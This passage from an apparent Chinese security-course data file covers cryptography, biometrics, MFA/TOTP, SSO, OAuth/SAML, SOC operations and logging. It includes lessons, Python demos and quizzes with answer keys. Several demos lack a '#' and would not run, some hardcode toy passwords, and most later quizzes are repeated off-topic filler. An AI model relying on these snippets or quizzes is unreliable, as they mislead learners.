    quiz: [{"id":"q16-1","question":"以下哪种是对称加密算法？","options":["RSA","AES","ECC","DSA"],"correctIndex":1,"explanation":"AES是对称加密算法。"},{"id":"q16-2","question":"数字签名使用什么密钥进行签名？","options":["接收者的公钥","发送者的私钥","发送者的公钥","共享密钥"],"correctIndex":1,"explanation":"数字签名使用发送者的私钥进行签名。"},{"id":"q16-3","question":"SHA-256的输出长度是多少位？","options":["128位","160位","256位","512位"],"correctIndex":2,"explanation":"SHA-256的输出长度是256位。"},{"id":"q16-4","question":"PKI体系中，CA的作用是什么？","options":["加密数据","签发和管理数字证书","存储用户密码","检测网络攻击"],"correctIndex":1,"explanation":"CA负责签发和管理数字证书。"},{"id":"q16-5","question":"HTTPS使用什么协议实现安全传输？","options":["IPSec","TLS/SSL","SSH","PGP"],"correctIndex":1,"explanation":"HTTPS使用TLS/SSL协议加密传输。"}],
    expertNotes: [{"author":"张伟","title":"密码学学习路径","content":"密码学不要一上来就啃数学公式。建议学习路径：先理解对称加密（AES）和非对称加密（RSA）的核心思想——一个是同一把钥匙，一个是公钥私钥对。然后再学哈希、数字签名、PKI。动手用OpenSSL生成证书是很好的实践。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"国密算法实践","content":"SM2/SM3/SM4是国产密码算法的核心，在政务和关键基础设施项目中已成为强制要求。SM2是椭圆曲线公钥密码算法，SM3是密码杂凑算法，SM4是分组密码算法。OpenSSL 1.1.1+已经支持国密算法。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"PKI体系建设经验","content":"CA的私钥保护是最关键的（建议使用HSM硬件安全模块），证书生命周期管理要自动化避免过期导致服务中断。中小企业可考虑Let's Encrypt或云厂商证书管理服务。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-17', day: 17, week: 3, title: '生物识别技术',
    objectives: ['了解生物识别类型', '理解优缺点', '掌握应用场景'],
    content: '# 生物识别技术\n\n## 生物识别类型\n\n### 生理特征\n\n#### 指纹识别\n- 最广泛使用\n- 成本较低\n- 准确度较高\n\n#### 面部识别\n- 非接触式\n- 隐私争议大\n- 受光照、表情影响\n\n#### 虹膜识别\n- 极高准确度\n- 难以伪造\n- 设备成本高\n\n#### 掌纹/掌静脉\n- 手掌特征丰富\n- 静脉识别需活体\n\n### 行为特征\n\n#### 语音识别\n- 通过声音特征识别\n- 易受环境噪音影响\n\n#### 签名动力学\n- 分析签名速度和压力\n- 传统方式易接受\n\n#### 击键节奏\n- 分析键盘输入习惯\n- 可用于持续认证\n\n## 优缺点分析\n\n### 优点\n- 不易遗忘和丢失\n- 难以复制和伪造\n- 使用方便快捷\n\n### 缺点\n- 不可撤销（泄露无法更换）\n- 存在误识率（FRR/FAR）\n- 隐私和伦理问题\n- 部分方式对健康有要求\n\n## 应用场景\n\n1. **设备解锁**：手机、笔记本\n2. **门禁系统**：办公区域\n3. **金融认证**：支付验证\n4. **边境检查**：护照核验\n\n## 最佳实践\n\n- 与其他认证结合使用（多因素）\n- 本地存储生物特征（不上传）\n- 提供备用认证方式\n- 定期评估误识率',
    codeExample: { language: 'python', code: '# 生物识别匹配模拟\ndef calculate_similarity(input_data, template, threshold=0.85):\n    """模拟相似度计算（实际使用复杂算法）"""\n    # 简化: 返回随机相似度\n    import random\n    similarity = random.uniform(0.7, 0.99)\n    if similarity >= threshold:\n        return True, similarity, f"匹配成功 ({similarity:.2%})"\n    else:\n        return False, similarity, f"匹配失败 ({similarity:.2%})"\n\n# 测试指纹认证\nprint("指纹认证测试")\nfor _ in range(3):\n    success, sim, msg = calculate_similarity("scanned_fp", "stored_fp")\n    print(f"  {msg}")', description: '模拟生物识别匹配' },
    quiz: [{"id":"q17-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q17-2","question":"以下关于生物识别技术的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q17-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q17-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q17-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-18', day: 18, week: 3, title: '多因素认证（MFA）',
    objectives: ['理解MFA原理', '了解常见形式', '掌握实现方法'],
    content: '# 多因素认证（MFA）\n\n> 📋 **本节大纲**\u2003五大MFA形式(TOTP/HOTP/短信/推送/硬件密钥) | TOTP工作原理 | FIDO2优势\n\n## 概述\n\nMFA（Multi-Factor Authentication）是目前对抗密码泄露最有效的手段。即使你的密码完全泄露，缺少第二个认证因素（手机/令牌/指纹），攻击者也无法登录。MFA可阻止99%的账户盗用攻击。\n\n## 五大MFA形式\n\n**TOTP（基于时间的一次性密码）：**\nGoogle Authenticator、Microsoft Authenticator使用此标准（RFC 6238）。每30秒生成6位数字，基于共享密钥+当前时间计算。不需要网络连接，比短信更安全。\n\n**HOTP（基于计数器的一次性密码）：**\nRFC 4226标准，基于计数器而非时间。每次使用密码计数器+1。问题：如果用户误触生成多个密码而不用，计数不同步。\n\n**短信验证码：**\n最简单也最不安全——SIM卡可被克隆劫持（SIM Swap攻击）。NIST已不推荐短信作为独立MFA方式。但仍有广泛使用。\n\n**推送通知：**\n手机APP弹出"是否允许登录"的确认窗口，用户一键批准。体验最好，安全性依赖于手机锁定状态。\n\n**硬件安全密钥：**\nYubiKey、Titan Security Key等FIDO2/U2F设备。插入USB或NFC触碰即可认证。防钓鱼——密钥绑定到网站域名，不会向钓鱼网站响应。最高安全性级别。\n\n## TOTP工作原理详解\n\n1. 注册时服务器生成随机种子密钥（Secret）并Base32编码\n2. 用户扫描二维码将种子存入手机Authenticator\n3. 登录时：手机用"种子+当前时间戳/30秒"做HMAC-SHA1运算，取最后4字节转换为6位数字\n4. 服务器用相同种子+时间做相同计算，比对是否匹配\n5. 服务器通常允许±1个时间窗口（前后各30秒），防止时钟偏差\n\n## MFA安全考量\n\n- **种子密钥安全存储：**加密存储，泄露=所有TOTP可被伪造\n- **时间同步：**服务器和设备时间需NTP同步\n- **备用恢复码：**设备丢失时使用预先保存的恢复码\n- **防暴力：**TOTP只有6位数字（100万组合），需配合账户锁定\n\n## \n## 🔴 高频考点\n\n· TOTP基于时间(30秒一变)、HOTP基于计数器——区分这两个易混淆概念\n· **SIM Swap**是短信验证码最致命威胁——攻击者克隆SIM卡可接收验证码\n· FIDO2硬件密钥(YubiKey)是最强MFA方案——防钓鱼(密钥绑定网站域名)\n## 💜 记忆口诀\n\n· **TOTP vs HOTP**："T靠时间(Time/30秒)、H靠计数(HMAC/用一次+1)"\n· **安全排行**："短信最弱→APP推送→硬件密钥最强(FIDO2防钓鱼)"\n学习建议\n- TOTP基于时间、HOTP基于计数器——区分清楚\n- SIM Swap是短信验证码最致命的安全威胁\n- FIDO2硬件密钥是目前最强的MFA方案',
    codeExample: { language: 'python', code: 'import time\nimport hmac\nimport base64\nimport struct\n\ndef generate_totp(secret, interval=30):\n    timestamp = int(time.time() // interval)\n    time_bytes = struct.pack(">Q", timestamp)\n    secret_bytes = base64.b32decode(secret)\n    hmac_result = hmac.new(secret_bytes, time_bytes, "sha1").digest()\n    offset = hmac_result[-1] & 0x0f\n    code = struct.unpack(">I", hmac_result[offset:offset+4])[0] & 0x7fffffff\n    return f"{code % 1000000:06d}"\n\n# 测试\nsecret = "JBSWY3DPEHPK3PXP"  # Base32密钥\nprint(f"TOTP: {generate_totp(secret)}")\nprint("(30秒后会变化)")', description: '演示TOTP算法' },
    quiz: [{"id":"q18-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q18-2","question":"以下关于多因素认证（MFA）的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q18-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q18-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q18-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-19', day: 19, week: 3, title: '单点登录（SSO）',
    objectives: ['理解SSO概念', '了解SSO协议', '掌握实现原理'],
    content: '# 单点登录（SSO）\n\n> 📋 **本节大纲**\u2003SSO四大协议(SAML/OAuth/OIDC/CAS) | SSO优势与风险 | SAML流程详解 | 协议对比表\n\n## 概述\n\nSSO（Single Sign-On）让用户一次登录后，无需再次输入密码即可访问多个关联系统。比如你用微信登录各种第三方网站就是SSO的典型应用。但SSO是一把双刃剑——虽然方便，但认证中心一旦沦陷则所有系统皆失。\n\n## SSO核心优势\n\n- **用户体验：**一次登录，全天畅通。省去记忆几十个不同密码的痛苦\n- **密码安全性：**用户只需维护一个高强度密码，不再为每个网站重复使用弱密码\n- **统一管理：**管理员在认证中心一处禁用账户，所有系统立即失效（离职回收权限的关键）\n- **降低IT成本：**减少密码重置工单——据统计40%的IT帮助台电话是"忘记密码"\n\n## SSO核心风险与缓解\n\n- **单点故障：**认证中心宕机→所有依赖系统无法登录。缓解：IdP高可用部署（多节点+负载均衡）\n- **账户沦陷影响扩大：**一个密码泄露→攻击者可登录所有系统。缓解：MFA强制绑定\n- **实现复杂：**需要改造所有接入系统支持SSO协议。缓解：选择成熟方案（Keycloak/Auth0）\n\n## 四大SSO协议\n\n### SAML 2.0（安全断言标记语言）\n- 基于XML的企业级标准，支持复杂的联邦认证和属性传递\n- 工作流程：用户访问SP→SP重定向到IdP→用户登录→IdP签发XML断言→返回SP验证\n- 适用：跨组织SSO、传统企业应用\n\n### OAuth 2.0（开放授权）\n- 本质是授权框架而非认证协议，允许第三方应用获取用户资源的访问权限\n- 四种授权模式：授权码（最安全/Web应用）、隐式（SPA）、密码（信任应用）、客户端凭证（服务间）\n- 关键角色：用户(Resource Owner)、第三方应用(Client)、授权服务器、资源服务器\n\n### OpenID Connect (OIDC)\n- 在OAuth 2.0之上添加身份认证层，使用JWT格式的ID Token传递用户信息\n- 现代Web/移动端首选，比SAML更轻量\n\n### CAS（中央认证服务）\n- 开源SSO协议，教育机构广泛使用\n\n## SAML vs OAuth vs OIDC速记\n\n| 协议 | 定位 | 数据格式 | 典型场景 |\n|------|------|---------|---------|\n| SAML | 认证 | XML | 企业SSO |\n| OAuth | 授权 | JSON | API授权 |\n| OIDC | 认证(基于OAuth) | JWT | 现代Web/移动 |\n\n## \n## 🔴 高频考点\n\n· SSO最大挑战：**单点故障(认证中心宕机→全部系统无法登录)+账户联合风险(一密码泄露→全沦陷)**\n· SAML(认证/XML/企业)vs OAuth(授权/JSON/API)vs OIDC(认证+OAuth/JWT/现代)——三重对比必考\n· IdP(身份提供者)和SP(服务提供者)的角色区分\n## 💜 记忆口诀\n\n· **SAML-OAuth-OIDC**："SAML认证XML、OAuth授权JSON、OIDC加身份"\n· **IdP vs SP**："IdP说我证明他是谁、SP说我相信你"\n学习建议\n- SSO最大的安全挑战是"单点故障"和"账户联合风险"\n- SAML和OAuth的本质区别：SAML=认证，OAuth=授权\n- OIDC是OAuth之上的认证层——把OAuth的授权能力拓展到认证',
    codeExample: {
      language: 'python',
      code: ` SSO会话管理模拟\nclass SSOManager:\n    def __init__(self):\n        self.sessions = {}\n    \n    def login(self, username, password):\n        valid_users = {"admin": "admin123", "user": "user123"}\n        if username in valid_users and valid_users[username] == password:\n            session_id = f"session_{len(self.sessions)+1}"\n            self.sessions[session_id] = username\n            return session_id\n        return None\n    \n    def validate(self, session_id):\n        return session_id in self.sessions\n\nsso = SSOManager()\nsid = sso.login("admin", "admin123")\nprint(f"登录成功: {sid}")\nprint(f"验证状态: {sso.validate(sid)}")`,
      description: '演示SSO会话管理',
    },
    quiz: [{"id":"q19-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q19-2","question":"以下关于单点登录（SSO）的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q19-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q19-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q19-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-20', day: 20, week: 3, title: 'OAuth与SAML',
    objectives: ['理解OAuth和SAML区别', '了解OAuth流程', '掌握应用场景'],
    content: '# OAuth与SAML\n\n## OAuth 2.0\n\n### 概念\n- 授权框架（注意：不是认证协议）\n- 允许第三方应用访问用户资源\n- 不直接处理用户认证\n\n### 授权类型\n\n1. **授权码模式（Authorization Code）**\n   - 最安全，适用于Web应用\n   - 流程：用户授权→获取授权码→交换令牌\n\n2. **简化模式（Implicit）**\n   - 适用于SPA单页应用\n   - 直接返回访问令牌\n\n3. **密码模式（Password）**\n   - 适用于信任的应用\n   - 用户直接提供密码\n\n4. **客户端凭证模式（Client Credentials）**\n   - 应用间调用\n   - 不涉及用户\n\n### OAuth角色\n- **Resource Owner**：资源所有者（用户）\n- **Client**：客户端（第三方应用）\n- **Authorization Server**：授权服务器\n- **Resource Server**：资源服务器（API）\n\n## SAML 2.0\n\n### 概念\n- 安全断言标记语言\n- 基于XML的协议\n- 专注于身份认证和SSO\n\n### SAML组件\n- **Identity Provider (IdP)**：身份提供者\n- **Service Provider (SP)**：服务提供者\n- **Assertion**：断言（包含用户信息）\n\n### 适用场景\n- 企业级SSO\n- 跨组织认证\n- 安全要求高的场景\n\n## OAuth vs SAML对比\n\n| 特性 | OAuth 2.0 | SAML 2.0 |\n|------|-----------|----------|\n| 类型 | 授权框架 | 认证协议 |\n| 格式 | JSON | XML |\n| 复杂度 | 简单 | 复杂 |\n| 适用 | 互联网、移动 | 企业SSO |\n| 令牌 | JWT、随机字符串 | 断言(XML) |\n\n## OpenID Connect (OIDC)\n- 基于OAuth 2.0的认证层\n- 使用ID Token（JWT格式）\n- 现代应用首选',
    codeExample: {
      language: 'python',
      code: ` OAuth授权流程模拟\nclass OAuthServer:\n    def __init__(self):\n        self.clients = {"app1": {"secret": "secret123"}}\n        self.tokens = {}\n    \n    def get_code(self, client_id):\n        return f"code_{client_id}_{len(self.tokens)}"\n    \n    def exchange_token(self, code):\n        token = f"token_{len(self.tokens)+1}"\n        self.tokens[token] = True\n        return token\n    \n    def validate_token(self, token):\n        return token in self.tokens\n\noauth = OAuthServer()\ncode = oauth.get_code("app1")\ntoken = oauth.exchange_token(code)\nprint(f"授权码: {code}")\nprint(f"访问令牌: {token}")\nprint(f"令牌有效: {oauth.validate_token(token)}")`,
      description: '演示OAuth授权流程',
    },
    quiz: [{"id":"q20-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q20-2","question":"以下关于OAuth与SAML的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q20-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q20-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q20-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-21', day: 21, week: 3, title: '第三周总结与测验',
    objectives: ['回顾第三周知识点', '检验学习成果', '为第四周做准备'],
    content: '# 第三周学习总结\n\n## 本周学习内容\n\n### Day 15: 身份认证基础\n- 认证因素：知识、持有、生物\n- 单因素 vs 多因素\n\n### Day 16: 密码认证技术\n- 密码安全原则\n- 密码哈希存储\n- 盐值作用\n\n### Day 17: 生物识别技术\n- 生理特征 vs 行为特征\n- 优缺点分析\n\n### Day 18: 多因素认证MFA\n- TOTP/HOTP算法\n- 常见MFA形式\n\n### Day 19: 单点登录SSO\n- SSO概念和优缺点\n- SAML、OAuth、OIDC\n\n### Day 20: OAuth与SAML\n- OAuth授权框架\n- SAML认证协议\n- 对比和应用场景\n\n## 知识要点\n\n| 技术 | 核心概念 |\n|------|----------|\n| 密码存储 | 加盐哈希 |\n| TOTP | 30秒+HMAC-SHA1 |\n| SAML | XML/企业SSO |\n| OAuth | JSON/授权框架 |\n| OIDC | OAuth之上的认证层 |\n\n## 下周预告\n\n第四周将学习安全运营：\n- 安全运营中心(SOC)\n- 日志管理\n- 事件响应\n- 安全监控',
    quiz: [{"id":"q21-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q21-2","question":"以下关于第三周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q21-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q21-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q21-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  // ========== Week 4: 安全运营 ==========
  {
    id: 'day-22', day: 22, week: 4, title: '安全运营概述',
    objectives: ['理解安全运营概念', '了解SOC职能', '掌握运营流程'],
    content: '# 安全运营概述\n\n> 📋 **本节大纲**\u2003SOC六大职能 | SOC人员层级L1-L2-L3 | 安全运营五步循环 | 成熟度模型 | MTTD/MTTR\n\n## 概述\n\n安全运营（SecOps）不同于"建设安全"——建设安全是"盖房子"，运营安全是"住房子+巡逻+救火"。安全运营意味着7×24持续监控、发现异常、快速响应、不断改进。SOC是安全运营的实体组织载体。\n\n## SOC安全运营中心\n\nSOC像一个网络安全版的"110指挥中心"——大屏显示实时攻击态势，分析师轮班盯着告警，一旦发现异常立即响应。\n\n### SOC六大核心职能\n1. **实时监控：**7×24不间断收集和分析安全设备（防火墙/IDS/WAF/EDR）的日志和告警\n2. **威胁检测：**从海量告警中识别真正的攻击，区分"真攻击"和"误报"\n3. **事件响应：**发现攻击后按PDCERF流程快速遏制、根除、恢复\n4. **威胁情报：**收集内外部威胁情报（APT组织TTP、最新漏洞利用代码），指导防御\n5. **漏洞管理：**跟踪新漏洞公告，评估影响范围，推动修复\n6. **合规报告：**为等保测评、ISO 27001审计提供安全运营证据\n\n### SOC人员层级（L1→L2→L3）\n- **L1分析师（初级）：**盯着SIEM告警屏幕，初步判断告警是真还是误报。约70%的告警在L1层处理完毕\n- **L2分析师（中级）：**调查L1升级的复杂告警，综合分析多源数据，确定攻击范围和影响\n- **L3专家（高级）：**主动"威胁狩猎"——不等告警，主动在日志中寻找攻击者潜伏的痕迹。还负责开发新的检测规则\n\n### 安全运营五步循环\n**监控**（收集日志）→ **检测**（分析告警）→ **响应**（遏制根除）→ **报告**（事件复盘）→ **改进**（优化规则）→ 回到监控。永远在循环，永远在改进。\n\n### 安全运营成熟度模型\n| 级别 | 特征 |\n|------|------|\n| 初始级 | 无正式流程，出了事再找人 |\n| 可重复级 | 有基本工具（SIEM），有标准流程 |\n| 已定义级 | 完善流程文档+定期培训+演练 |\n| 可管理级 | KPI驱动（MTTD平均检测时间、MTTR平均响应时间）|\n| 持续优化级 | 自动化(SOAR)+AI辅助+持续改进 |\n\n### 核心KPI指标\n- **MTTD（Mean Time to Detect）：**从攻击发生到被发现的平均时间。越短越好\n- **MTTR（Mean Time to Respond）：**从发现到处置完成的平均时间。越短越好\n- **告警准确率：**真阳性告警/总告警数。SOC的"生产力"指标\n\n## \n## 🔴 高频考点\n\n· SOC的L1/L2/L3分析师职责——L1初筛(70%告警)、L2深入调查、L3主动威胁狩猎\n· 评估SOC效能的两大KPI：**MTTD(平均检测时间)和MTTR(平均响应时间)**\n· 安全运营成熟度五级：初始→可重复→已定义→可管理→持续优化\n## 💜 记忆口诀\n\n· **L1-L3**："L1看屏初筛、L2深入调查、L3主动猎"\n· **双指标**："MTTD多久发现(Detection)、MTTR多久解决(Response)"\n学习建议\n- SOC L1/L2/L3的职责划分是CISP考试常见考点\n- MTTD和MTTR是评估SOC效能的核心指标\n- 安全运营是"持续"的——不是一次性的',
    codeExample: {
      language: 'python',
      code: ` 安全事件分类\ndef classify_event(severity, type):\n    levels = {1: "低", 2: "中", 3: "高", 4: "严重"}\n    event_types = {\n        "malware": "恶意软件",\n        "phishing": "钓鱼攻击",\n        "intrusion": "入侵尝试",\n        "data_leak": "数据泄露"\n    }\n    return levels.get(severity, "未知"), event_types.get(type, "其他")\n\n# 模拟事件\nevents = [\n    (3, "phishing"),\n    (4, "data_leak"),\n    (2, "intrusion"),\n]\nfor sev, typ in events:\n    level, name = classify_event(sev, typ)\n    print(f"事件: {name} | 级别: {level}")`,
      description: '演示安全事件分类',
    },
    quiz: [{"id":"q22-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q22-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q22-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q22-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q22-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-23', day: 23, week: 4, title: '日志管理',
    objectives: ['理解日志重要性', '了解日志类型', '掌握日志分析方法'],
    content: '# 日志管理\n\n> 📋 **本节大纲**\u2003四大类日志 | 集中日志方案(ELK/Splunk) | 分析方法(基线/关联/时间线) | 留存要求\n\n## 概述\n\n日志是安全运营的"黑匣子"——攻击者的每一个动作都会在系统中留下痕迹。没有日志，安全事件就成了无头悬案；有了高质量的日志，攻击的全过程可被还原。CISP考试重点考查日志类型、集中收集方案和留存要求。\n\n## 日志的核心价值\n- **事件检测：**从日志中发现异常——多次登录失败=可能暴力破解\n- **事件调查：**安全事件发生后的溯源取证——攻击者何时进入、做了什么、拿了什么\n- **合规审计：**法律法规（网络安全法/等保/GDPR）要求保留日志\n- **故障诊断：**系统和应用问题的排查依据\n\n## 四大类日志\n\n**系统日志：**Windows Event Log（4624登录成功/4625登录失败/4672特权分配）、Linux syslog（/var/log/auth.log认证日志）\n\n**安全日志：**防火墙（拒绝的流量记录）、IDS/IPS（攻击签名匹配）、VPN（连接/断开记录）、EDR（进程创建/网络连接）\n\n**应用日志：**Web服务器（Apache/Nginx access日志含URL/状态码/User-Agent）、数据库（慢查询/错误日志）、自定义应用日志\n\n**网络日志：**DNS查询、DHCP租约（IP→MAC对应关系）、NetFlow流量元数据\n\n## 日志集中管理：Syslog → SIEM\n\n**Syslog协议：**标准的日志传输协议。Facility（日志来源类别）×Severity（严重级别0紧急~7调试）= 分类传输\n\n**ELK Stack：**Elasticsearch（全文搜索）+Logstash（收集范式化）+Kibana（可视化）——开源黄金组合\n\n**Splunk：**商业SIEM平台，强大搜索语言SPL，但价格高昂\n\n## 日志分析法\n- **基线分析：**统计正常时段的访问量、错误率、流量模式→偏离基线即告警\n- **关联分析：**"账号A在3分钟内从3个不同国家IP登录"——单条日志看似正常，关联后暴露异常\n- **时间线还原：**将攻击链按时间排序——"22:00端口扫描→22:05 SSH暴力破解→22:30成功登录→23:00数据外传"\n\n## 日志留存与安全\n- **留存要求：**网络安全法≥6个月、等保三级≥6个月、PCI DSS至少1年\n- 